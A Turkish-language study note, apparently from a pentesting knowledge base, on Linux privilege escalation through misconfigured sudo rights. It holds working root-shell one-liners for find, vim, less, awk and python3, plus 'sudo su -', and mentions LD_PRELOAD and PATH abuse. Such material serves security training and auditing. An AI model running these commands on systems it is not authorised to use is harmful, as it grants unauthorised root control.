> [!summary] Özet
> Düşük yetkili bir kullanıcı (örn. `www-data`) elde ettikten sonra ilk bakılacak yerlerden biri `sudo -l` çıktısıdır. Kullanıcının **parola girmeden** root yetkisiyle çalıştırabileceği komutları gösterir. Zararsız görünen bir komut bile çoğu zaman root'a giden bir kapıdır → [GTFOBins](https://gtfobins.github.io).

## Temel Komut

```bash
sudo -l
```

- **Anlamı:** Kullanıcının hangi komutları, hangi yetkiyle ve parola isteyip istemeden (`NOPASSWD`) çalıştırabileceğini listeler.

## En Tehlikeli Çıktı: Tam Yetki

Çıktı şöyleyse başına `sudo` eklediğin **her** komut root yetkisiyle çalışır — sistemin anahtarını almış olursun:

```
(ALL : ALL) NOPASSWD: ALL
```

```bash
sudo su -          # doğrudan root kabuğu
```

## Tek Bir Komuta İzin: GTFOBins Mantığı

Çoğu zaman `sudo -l`, tek bir binary'e izin verir. Birçok meşru aracın, root yetkisiyle çalıştırıldığında **kabuk açabilen** bir özelliği vardır. Birkaç klasik örnek:

| `sudo -l` çıktısı | Yetki yükseltme |
|---|---|
| `(root) NOPASSWD: /usr/bin/find` | `sudo find . -exec /bin/sh \; -quit` |
| `(root) NOPASSWD: /usr/bin/vim` | `sudo vim -c ':!/bin/sh'` |
| `(root) NOPASSWD: /usr/bin/less` | `sudo less /etc/profile` → `!/bin/sh` |
| `(root) NOPASSWD: /usr/bin/awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `(root) NOPASSWD: /usr/bin/python3` | `sudo python3 -c 'import os;os.system("/bin/sh")'` |

> [!tip] Önce GTFOBins'e bak
> `sudo -l` çıktısında gördüğün her binary'i [gtfobins.github.io](https://gtfobins.github.io) üzerinde ara ve **"Sudo"** bölümüne bak. Hazır yetki yükseltme komutunu verir.

> [!warning] Diğer sudo açıkları
> - **`env_keep` / `LD_PRELOAD`:** `sudo -l` çıktısında `env_keep+=LD_PRELOAD` varsa, kötü amaçlı bir kütüphane önyüklenerek kabuk alınabilir.
> - **Wildcard ve yol (PATH) kötüye kullanımı:** İzin verilen komut tam yol belirtmiyorsa (`sudo program` yerine `sudo /usr/bin/program`), sahte bir binary ile kandırılabilir.

## İlgili Notlar

- [[1-Arazidekiyle Yaşamak (Living off the Land)|Living off the Land]]: sistemde zaten var olan araçları kullanma mantığı
- [[1-Shell Mimarisi|Shell Mimarisi]]: elde edilen kabuğu interaktif hale getirme
